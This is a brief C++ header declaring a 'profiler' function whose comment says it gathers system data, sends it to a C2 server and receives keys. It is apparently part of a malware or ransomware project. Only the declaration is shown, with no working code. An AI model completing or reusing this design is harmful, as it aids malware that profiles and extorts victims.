#pragma once
#include "json.hpp"
#include "gen_uid.h"


/// <summary>
/// This function is used for system profiling.
/// It returns JSON data and its data is sent to C2 and keys are returned.
/// </summary>
/// <param name="filesCount"></param>
/// <returns></returns>
nlohmann::json profiler(std::string filesCount);

